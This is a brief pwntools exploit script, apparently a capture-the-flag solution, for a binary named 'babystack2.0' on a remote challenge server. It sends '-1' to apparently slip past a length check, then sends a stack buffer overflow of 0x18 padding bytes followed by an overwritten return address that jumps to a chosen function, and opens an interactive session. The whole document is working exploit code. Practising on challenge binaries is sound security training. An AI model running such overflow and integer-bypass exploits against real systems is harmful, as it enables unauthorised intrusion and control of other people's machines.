from pwn import *

elf=ELF('./babystack2.0')

# io=process('./babystack2.0')
io=remote("1.14.71.254",28264)
io.sendline(b'-1')
ret_addr=0x400599
func_addr=0x400726
payload=cyclic(0x18)+p64(func_addr)
# payload=cyclic(0x18)+p64(ret_addr)+p64(func_addr)
io.sendline(payload)
io.interactive()